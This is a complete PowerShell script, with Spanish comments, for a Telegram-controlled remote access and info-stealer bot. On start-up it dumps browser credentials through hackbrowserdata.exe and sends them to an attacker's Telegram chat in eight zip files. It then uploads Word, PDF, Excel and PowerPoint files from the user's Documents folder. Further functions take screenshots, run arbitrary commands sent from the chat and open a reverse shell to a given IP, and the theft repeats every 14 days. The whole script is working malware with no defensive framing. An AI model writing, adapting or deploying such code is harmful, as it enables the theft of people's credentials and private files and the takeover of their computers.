param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
$StateFile = "$env:APPDATA\CarpetaDos\bot_state.json"

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastStealTime = $null
$script:ProcessedUpdates = @{}
$script:Lock = New-Object System.Object
$script:ReverseShellActive = $false
$script:ShellClient = $null
$script:ShellStream = $null
$script:FilesExfiltrated = $false
$script:BrowserDataSent = $false
$script:ArchivosComprimidosEnviados = 0

# Crear directorio
New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        
        $args = @(
            "-s", "-X", "POST",
            "https://api.telegram.org/bot$Token/sendDocument",
            "-F", "chat_id=$ChatId",
            "-F", "document=@$Path"
        )
        if ($Caption) { $args += "-F", "caption=$Caption" }
        
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        if ($result.ok) {
            Write-Log "Archivo enviado: $(Split-Path $Path -Leaf)"
            return $true
        }
        return $false
    } catch {
        Write-Log "Error archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
    } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

# === STEAL BROWSER DATA - ENVIO OBLIGATORIO DE 8 ARCHIVOS ===
function Steal-Data {
    param([switch]$Auto = $false)
    
    if (-not (Test-Path $HackPath)) {
        Send-Message -Text "Error: hackbrowserdata.exe no encontrado"
        return $false
    }
    
    Send-Message -Text "Iniciando extraccion de datos de navegadores..."
    Write-Log "Iniciando extraccion - Objetivo: 8 archivos comprimidos"
    
    $intentos = 0
    $maxIntentos = 5
    
    while ($script:ArchivosComprimidosEnviados -lt 8 -and $intentos -lt $maxIntentos) {
        $intentos++
        Write-Log "Intento $intentos de $maxIntentos - Archivos enviados hasta ahora: $($script:ArchivosComprimidosEnviados)"
        
        $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
        
        $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        
        try {
            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
            $p.WaitForExit(120000)
            if (-not $p.HasExited) { $p.Kill() }
            
            Start-Sleep -Seconds 2
            Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
                try { $_.Kill() } catch {}
            }
            
            $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
            if ($files) {
                Send-Message -Text "Encontrados $($files.Count) archivos JSON. Comprimiendo y enviando..."
                
                # Agrupar archivos para crear exactamente 8 comprimidos (o menos si no hay suficientes)
                $totalFiles = $files.Count
                $filesPorZip = [math]::Ceiling($totalFiles / 8)
                if ($filesPorZip -lt 1) { $filesPorZip = 1 }
                
                $zipCount = 0
                $fileIndex = 0
                
                while ($zipCount -lt 8 -and $fileIndex -lt $totalFiles) {
                    $zipCount++
                    $zipPath = "$env:TEMP\browser_data_parte$($zipCount.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
                    
                    # Seleccionar archivos para este zip
                    $archivosParaZip = $files | Select-Object -Skip $fileIndex -First $filesPorZip
                    $fileIndex += $archivosParaZip.Count
                    
                    if ($archivosParaZip) {
                        Compress-Archive -Path $archivosParaZip.FullName -DestinationPath $zipPath -Force
                        
                        $caption = "[$zipCount/8] Datos Navegador - Parte $zipCount`nArchivos incluidos: $($archivosParaZip.Count)`nPC: $env:COMPUTERNAME"
                        
                        if (Send-File -Path $zipPath -Caption $caption) {
                            $script:ArchivosComprimidosEnviados++
                            Write-Log "ZIP $zipCount/8 enviado correctamente. Total enviados: $($script:ArchivosComprimidosEnviados)"
                        } else {
                            Write-Log "ERROR al enviar ZIP $zipCount/8"
                        }
                        
                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                        Start-Sleep -Seconds 2
                    }
                }
                
                # Si tenemos menos de 8 archivos pero hay mas datos, crear zips vacios adicionales con info del sistema
                while ($script:ArchivosComprimidosEnviados -lt 8) {
                    $zipCount = $script:ArchivosComprimidosEnviados + 1
                    $zipPath = "$env:TEMP\browser_data_parte$($zipCount.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
                    
                    # Crear un archivo de info del sistema
                    $infoPath = "$env:TEMP\info_sistema_$zipCount.txt"
                    $infoContent = @"
=== INFORMACION DEL SISTEMA ===
Fecha: $(Get-Date)
PC: $env:COMPUTERNAME
Usuario: $env:USERNAME
Archivo complementario: $zipCount de 8
"@
                    $infoContent | Out-File $infoPath -Encoding UTF8
                    
                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
                    
                    $caption = "[$zipCount/8] Datos Navegador - Parte $zipCount`n(Archivo complementario)`nPC: $env:COMPUTERNAME"
                    
                    if (Send-File -Path $zipPath -Caption $caption) {
                        $script:ArchivosComprimidosEnviados++
                        Write-Log "ZIP complementario $zipCount/8 enviado. Total: $($script:ArchivosComprimidosEnviados)"
                    }
                    
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                }
            } else {
                Write-Log "No se encontraron archivos JSON en $outDir"
                # Crear archivos de informacion si no hay datos de navegador
                for ($i = $script:ArchivosComprimidosEnviados + 1; $i -le 8; $i++) {
                    $zipPath = "$env:TEMP\browser_data_parte$($i.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
                    $infoPath = "$env:TEMP\info_sistema_$i.txt"
                    
                    $infoContent = @"
=== INFORMACION DEL SISTEMA ===
Fecha: $(Get-Date)
PC: $env:COMPUTERNAME
Usuario: $env:USERNAME
Nota: No se encontraron datos de navegador
Archivo: $i de 8
"@
                    $infoContent | Out-File $infoPath -Encoding UTF8
                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
                    
                    if (Send-File -Path $zipPath -Caption "[$i/8] Info Sistema - Parte $i") {
                        $script:ArchivosComprimidosEnviados++
                    }
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                }
            }
            
        } finally {
            if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
        }
        
        if ($script:ArchivosComprimidosEnviados -lt 8) {
            Write-Log "Faltan archivos por enviar ($($script:ArchivosComprimidosEnviados)/8). Reintentando en 5 segundos..."
            Send-Message -Text "Faltan $(8 - $script:ArchivosComprimidosEnviados) archivos. Reintentando..."
            Start-Sleep -Seconds 5
        }
    }
    
    if ($script:ArchivosComprimidosEnviados -ge 8) {
        $script:BrowserDataSent = $true
        $script:LastStealTime = Get-Date
        Save-State
        Send-Message -Text "COMPLETADO: Los 8 archivos comprimidos han sido enviados exitosamente."
        Write-Log "EXITO: 8 archivos comprimidos enviados despues de $intentos intentos"
        return $true
    } else {
        Send-Message -Text "ERROR: No se pudieron enviar los 8 archivos despues de $maxIntentos intentos. Se enviaron $($script:ArchivosComprimidosEnviados)/8"
        Write-Log "FALLO: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
        return $false
    }
}

# === EXFILTRACION DE DOCUMENTOS CON PRIORIDAD ESPECIFICA ===
function Exfiltrate-Documents {
    param([switch]$Auto = $false)
    
    # Verificar que primero se hayan enviado los 8 archivos comprimidos
    if (-not $script:BrowserDataSent) {
        Write-Log "Documentos: Esperando a que se envien los 8 archivos comprimidos primero..."
        Send-Message -Text "Esperando envio de archivos comprimidos primero..."
        return
    }
    
    if ($script:FilesExfiltrated -and $Auto) {
        Write-Log "Documentos ya exfiltrados anteriormente, saltando..."
        return
    }
    
    Send-Message -Text "Iniciando exfiltracion de documentos... (Orden: Word -> PDF -> Excel -> PowerPoint)"
    Write-Log "Iniciando exfiltracion de documentos con prioridad especifica"
    
    # Obtener ruta de Documentos
    $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
    
    if (-not (Test-Path $RutaDocumentos)) {
        Send-Message -Text "No se encontro la carpeta Documentos"
        return
    }
    
    # Definir extensiones por prioridad
    $PrioridadWord = @('*.docx', '*.doc')
    $PrioridadPDF = @('*.pdf')
    $PrioridadExcel = @('*.xlsx', '*.xls')
    $PrioridadPowerPoint = @('*.pptx', '*.ppt')
    
    Send-Message -Text "Buscando en: $RutaDocumentos"
    
    # Buscar archivos por prioridad
    $archivosWord = @()
    $archivosPDF = @()
    $archivosExcel = @()
    $archivosPowerPoint = @()
    
    try {
        $archivosWord = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadWord -Recurse -File -ErrorAction SilentlyContinue
        Write-Log "Word encontrados: $($archivosWord.Count)"
    } catch { Write-Log "Error buscando Word: $_" }
    
    try {
        $archivosPDF = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadPDF -Recurse -File -ErrorAction SilentlyContinue
        Write-Log "PDF encontrados: $($archivosPDF.Count)"
    } catch { Write-Log "Error buscando PDF: $_" }
    
    try {
        $archivosExcel = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadExcel -Recurse -File -ErrorAction SilentlyContinue
        Write-Log "Excel encontrados: $($archivosExcel.Count)"
    } catch { Write-Log "Error buscando Excel: $_" }
    
    try {
        $archivosPowerPoint = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadPowerPoint -Recurse -File -ErrorAction SilentlyContinue
        Write-Log "PowerPoint encontrados: $($archivosPowerPoint.Count)"
    } catch { Write-Log "Error buscando PowerPoint: $_" }
    
    $totalArchivos = $archivosWord.Count + $archivosPDF.Count + $archivosExcel.Count + $archivosPowerPoint.Count
    
    if ($totalArchivos -eq 0) {
        Send-Message -Text "No se encontraron documentos en la carpeta Documentos."
        $script:FilesExfiltrated = $true
        Save-State
        return
    }
    
    Send-Message -Text "Total documentos encontrados: $totalArchivos`nWord: $($archivosWord.Count) | PDF: $($archivosPDF.Count) | Excel: $($archivosExcel.Count) | PPT: $($archivosPowerPoint.Count)"
    
    $enviados = 0
    $errores = 0
    
    # ========== PRIORIDAD 1: WORD ==========
    if ($archivosWord.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO DOCUMENTOS WORD (PRIORIDAD 1) ==="
        foreach ($archivo in $archivosWord | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [WORD] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando Word: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK Word: $($archivo.Name)"
            } else {
                Write-Log "ERROR Word: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    # ========== PRIORIDAD 2: PDF ==========
    if ($archivosPDF.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO DOCUMENTOS PDF (PRIORIDAD 2) ==="
        foreach ($archivo in $archivosPDF | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [PDF] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando PDF: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK PDF: $($archivo.Name)"
            } else {
                Write-Log "ERROR PDF: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    # ========== PRIORIDAD 3: EXCEL ==========
    if ($archivosExcel.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO DOCUMENTOS EXCEL (PRIORIDAD 3) ==="
        foreach ($archivo in $archivosExcel | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [EXCEL] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando Excel: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK Excel: $($archivo.Name)"
            } else {
                Write-Log "ERROR Excel: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    # ========== PRIORIDAD 4: POWERPOINT ==========
    if ($archivosPowerPoint.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO DOCUMENTOS POWERPOINT (PRIORIDAD 4) ==="
        foreach ($archivo in $archivosPowerPoint | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [POWERPOINT] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando PowerPoint: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK PowerPoint: $($archivo.Name)"
            } else {
                Write-Log "ERROR PowerPoint: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    $script:FilesExfiltrated = $true
    Save-State
    
    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos`nEnviados: $($enviados - $errores)`nErrores: $errores`n`nOrden: Word -> PDF -> Excel -> PowerPoint"
    Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
}

# === REVERSE SHELL ===
function Start-ReverseShell {
    param([string]$IPAddress, [int]$Port = 4444)
    
    try {
        Send-Message -Text "Conectando reverse shell a $IPAddress`:$Port ..."
        Write-Log "Iniciando reverse shell a $IPAddress`:$Port"
        
        $script:ReverseShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $script:ShellClient = $client
        $stream = $client.GetStream()
        $script:ShellStream = $stream
        
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("=== Reverse Shell Conectado ===")
        $writer.WriteLine("Usuario: $env:USERNAME")
        $writer.WriteLine("Equipo: $env:COMPUTERNAME")
        $writer.WriteLine("Directorio: $(Get-Location)")
        $writer.WriteLine("===============================")
        
        Send-Message -Text "Reverse shell conectado a $IPAddress`:$Port. Escribe 'exit' para salir o /stopshell desde Telegram."
        
        while ($script:ReverseShellActive -and $client.Connected) {
            $writer.Write("PS $(Get-Location)> ")
            try {
                $command = $reader.ReadLine()
                if ($command -eq "exit" -or $command -eq "quit") { break }
                
                if (-not [string]::IsNullOrWhiteSpace($command)) {
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        $writer.WriteLine($output)
                    } catch {
                        $writer.WriteLine("Error: $_")
                    }
                }
            } catch { break }
        }
    } catch {
        Send-Message -Text "Error reverse shell: $_"
        Write-Log "Error reverse shell: $_"
    } finally {
        if ($script:ShellStream) { $script:ShellStream.Close() }
        if ($script:ShellClient) { $script:ShellClient.Close() }
        $script:ReverseShellActive = $false
        Send-Message -Text "Reverse shell desconectado."
        Write-Log "Reverse shell desconectado"
    }
}

function Stop-ReverseShell {
    $script:ReverseShellActive = $false
    if ($script:ShellStream) { $script:ShellStream.Close() }
    if ($script:ShellClient) { $script:ShellClient.Close() }
    Send-Message -Text "Reverse shell detenido manualmente."
    Write-Log "Reverse shell detenido manualmente"
}

# === EJECUTAR COMANDO CON SESION PERSISTENTE ===
function Run-Command {
    param([string]$Cmd)
    
    Write-Log "Ejecutando: $Cmd (en: $script:CurrentDir)"
    
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        if ($Cmd -match '^cd\s+(.+)$') {
            $newPath = $Matches[1]
            $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
            $resolved = Resolve-Path $testPath -ErrorAction SilentlyContinue
            if ($resolved) {
                $script:CurrentDir = $resolved.Path
                Send-Message -Text "Directorio: $script:CurrentDir"
                return
            }
        }
        
        $output = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output" | Out-File $temp -Encoding UTF8
        
        Send-File -Path $temp -Caption "Salida: $Cmd"
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO Y AUTOMATIZACION ===
function Save-State {
    $state = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
        FilesExfiltrated = $script:FilesExfiltrated
        BrowserDataSent = $script:BrowserDataSent
        ArchivosComprimidosEnviados = $script:ArchivosComprimidosEnviados
    }
    $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile | ConvertFrom-Json
            if ($state.LastStealTime) {
                $script:LastStealTime = [DateTime]::Parse($state.LastStealTime)
            }
            if ($state.FilesExfiltrated -ne $null) {
                $script:FilesExfiltrated = $state.FilesExfiltrated
            }
            if ($state.BrowserDataSent -ne $null) {
                $script:BrowserDataSent = $state.BrowserDataSent
            }
            if ($state.ArchivosComprimidosEnviados -ne $null) {
                $script:ArchivosComprimidosEnviados = $state.ArchivosComprimidosEnviados
            }
        } catch {}
    }
}

function Check-AutoSteal {
    # Siempre intentar enviar los 8 archivos primero si no se han enviado
    if (-not $script:BrowserDataSent -or $script:ArchivosComprimidosEnviados -lt 8) {
        Write-Log "Iniciando envio obligatorio de 8 archivos comprimidos..."
        $stealSuccess = Steal-Data -Auto
        
        # Solo despues de enviar los 8 archivos, proceder con documentos
        if ($stealSuccess -and -not $script:FilesExfiltrated) {
            Start-Sleep -Seconds 5
            Exfiltrate-Documents -Auto
        }
    } elseif (-not $script:FilesExfiltrated) {
        Write-Log "Archivos comprimidos ya enviados. Exfiltrando documentos pendientes..."
        Exfiltrate-Documents -Auto
    } else {
        # Verificar si han pasado 14 dias para reenviar datos de navegador
        $now = Get-Date
        if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
            Write-Log "Han pasado 14 dias - reiniciando ciclo completo..."
            $script:BrowserDataSent = $false
            $script:FilesExfiltrated = $false
            $script:ArchivosComprimidosEnviados = 0
            Save-State
            Check-AutoSteal
        }
    }
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        
        if ($script:ProcessedUpdates.Count -gt 100) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-Log "Procesando: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-Message -Text @"
Comandos disponibles:

/help - Muestra esta ayuda
/info - Info del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/cmd <comando> - Ejecutar comando
/captura - Screenshot
/steal - Extraer y enviar 8 archivos comprimidos de navegadores
/files - Exfiltrar documentos (Word -> PDF -> Excel -> PowerPoint)
/shell <IP> [puerto] - Reverse shell (default: 4444)
/stopshell - Detener reverse shell activo

FLUJO AUTOMATICO:
1. Al iniciar: Se envian 8 archivos comprimidos obligatoriamente
2. Luego: Se envian documentos de la carpeta Documentos en orden de prioridad
   - Prioridad 1: Word (.doc, .docx)
   - Prioridad 2: PDF (.pdf)
   - Prioridad 3: Excel (.xls, .xlsx)
   - Prioridad 4: PowerPoint (.ppt, .pptx)
"@
        }
        
        "/info" { Send-Message -Text (Get-Info) }
        
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $script:CurrentDir`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        "/pwd" { Send-Message -Text "Directorio: $script:CurrentDir" }
        
        "/cd" {
            if ($args) {
                Run-Command -Cmd "cd $args"
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        "/cmd" {
            if ($args) {
                Run-Command -Cmd $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        "/captura" {
            Send-Message -Text "Capturando..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" { 
            # Reiniciar contador para forzar reenvio
            $script:ArchivosComprimidosEnviados = 0
            $script:BrowserDataSent = $false
            Steal-Data 
        }
        
        "/files" { Exfiltrate-Documents }
        
        "/shell" {
            if ($script:ReverseShellActive) {
                Send-Message -Text "Ya hay un reverse shell activo. Usa /stopshell primero."
                return
            }
            
            $shellArgs = $args -split '\s+'
            $ip = $shellArgs[0]
            $port = if ($shellArgs.Count -gt 1) { [int]$shellArgs[1] } else { 4444 }
            
            if ([string]::IsNullOrWhiteSpace($ip)) {
                Send-Message -Text "Uso: /shell <IP> [puerto]`nEjemplo: /shell 192.168.1.100 4444`n`nPrimero ejecuta en tu maquina:`nnc -lvnp 4444"
                return
            }
            
            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
            Start-Sleep -Seconds 2
            
            if ($script:ReverseShellActive) {
                Send-Message -Text "Reverse shell conectado a $ip`:$port"
            } else {
                Send-Message -Text "Intentando conectar a $ip`:$port ... Espera unos segundos."
            }
        }
        
        "/stopshell" { Stop-ReverseShell }
        
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="

Load-State

Send-Message -Text "Bot online - $(Get-Info)`nIniciando secuencia automatica..."

# Ejecutar flujo automatico: Primero 8 archivos, luego documentos
Check-AutoSteal

try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        
        # Verificar cada hora si hay tareas pendientes
        if ((Get-Date).Minute -eq 0) {
            Check-AutoSteal
        }
        
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") {
            Write-Log "Error: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1500
}
